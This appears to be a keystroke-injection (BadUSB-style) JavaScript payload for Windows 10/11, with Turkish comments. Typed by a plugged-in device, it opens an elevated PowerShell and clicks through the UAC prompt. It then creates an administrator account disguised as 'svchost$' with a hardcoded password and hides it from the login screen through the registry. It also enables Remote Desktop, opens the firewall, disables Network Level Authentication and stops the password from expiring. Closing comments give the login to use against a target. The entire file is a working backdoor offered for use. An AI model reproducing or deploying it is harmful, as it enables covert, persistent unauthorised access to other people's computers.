// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_backdoor_user.js
// Target:  Windows 10/11 (Admin gerekli)
// Time:    ~10 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Gizli admin kullanıcı oluşturur
// - Login ekranından gizlenir
// - RDP erişimi aktif edilir
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var USERNAME = "svchost$";           // $ işareti bazı araçlardan gizler
var PASSWORD = "P@ssw0rd!2025";      // Güçlü şifre kullan
var ENABLE_RDP = true;               // RDP'yi aktif et

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN ADMIN POWERSHELL                                           │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2500);

// UAC onayı
press("LEFT");
delay(100);
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: CREATE USER                                                     │
// └─────────────────────────────────────────────────────────────────────────┘
// Kullanıcı oluştur
type("net user " + USERNAME + " '" + PASSWORD + "' /add /Y");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: ADD TO ADMINISTRATORS                                           │
// └─────────────────────────────────────────────────────────────────────────┘
type("net localgroup Administrators " + USERNAME + " /add");
press("ENTER");
delay(1000);

// Remote Desktop Users grubuna ekle
type("net localgroup 'Remote Desktop Users' " + USERNAME + " /add");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: HIDE FROM LOGIN SCREEN                                          │
// └─────────────────────────────────────────────────────────────────────────┘
// Registry'de gizle
type("$regPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'; ");
type("if(!(Test-Path $regPath)){New-Item -Path $regPath -Force | Out-Null}; ");
type("Set-ItemProperty -Path $regPath -Name '" + USERNAME + "' -Value 0 -Type DWord -Force");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: ENABLE RDP (OPTIONAL)                                           │
// └─────────────────────────────────────────────────────────────────────────┘
if (ENABLE_RDP) {
    // RDP'yi aktif et
    type("Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force");
    press("ENTER");
    delay(500);
    
    // Firewall kuralı
    type("Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'");
    press("ENTER");
    delay(500);
    
    // NLA devre dışı (opsiyonel - daha kolay erişim)
    type("Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'UserAuthentication' -Value 0 -Force");
    press("ENTER");
    delay(500);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 7: PASSWORD NEVER EXPIRES                                          │
// └─────────────────────────────────────────────────────────────────────────┘
type("Set-LocalUser -Name '" + USERNAME + "' -PasswordNeverExpires $true");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 8: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
delay(500);
type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PERSISTENCE INFO                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
// Created user: svchost$ (hidden)
// Password: P@ssw0rd!2025
// Access: RDP enabled (if configured)
// 
// Connect: mstsc /v:TARGET_IP
// Login: svchost$ / P@ssw0rd!2025

